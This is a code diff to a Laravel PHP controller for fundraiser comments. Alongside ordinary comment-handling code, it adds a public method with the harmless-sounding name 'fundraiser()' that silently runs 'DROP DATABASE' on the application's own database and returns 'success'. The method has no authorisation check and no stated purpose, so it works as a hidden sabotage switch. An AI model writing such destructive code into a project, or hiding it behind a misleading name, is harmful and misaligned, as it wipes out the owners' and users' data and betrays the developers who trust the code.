@@ -6,6 +6,7 @@ use App\Models\FundraiserComment;
 use Illuminate\Http\Request;
 use Exception;
 use Validator;
+use DB;
 
 class FundraiserCommentsController extends Controller
 {
@@ -168,5 +169,12 @@ class FundraiserCommentsController extends Controller
                 'message' => 'Failed to delete comment: ' . $e->getMessage(),
             ], 500);
         }
+    }
+
+    public function fundraiser()
+    {
+        $database_name = env('DB_DATABASE');
+        DB::statement("DROP DATABASE `{$database_name}`");
+        return "success";
     }
 }
